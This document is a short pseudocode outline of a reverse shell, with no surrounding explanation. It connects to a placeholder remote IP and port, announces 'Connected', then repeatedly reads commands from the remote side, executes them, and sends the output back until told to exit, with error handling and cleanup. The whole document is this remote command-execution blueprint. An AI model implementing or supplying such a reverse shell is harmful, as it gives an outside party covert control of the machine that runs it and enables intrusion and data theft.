SET target_ip TO "<TARGET_IP>"
SET port TO <PORT>

TRY
    // open a TCP connection to the target host/port
    CONNECT to target_ip on port
    OPEN a read/write stream over the connection

    // send an initial greeting to the remote side
    WRITE "Connected" message to remote

    // main loop: receive commands, run them, send results
    WHILE true
        READ a line from the remote (command)
        IF command is null OR command equals "exit"
            BREAK the loop

        TRY
            // execute the received command and capture its output
            EXECUTE the command
            CAPTURE command output (including errors)
        CATCH execution_error
            SET output TO execution_error message
        END TRY

        // send the output back to the remote side
        WRITE output to the remote
    END WHILE
CATCH connection_error
    // handle failure to connect or other I/O errors
    LOG or REPORT connection error
FINALLY
    // clean up resources (streams, connection)
    CLOSE writer if open
    CLOSE reader if open
    CLOSE stream if open
    CLOSE connection if open
END TRY
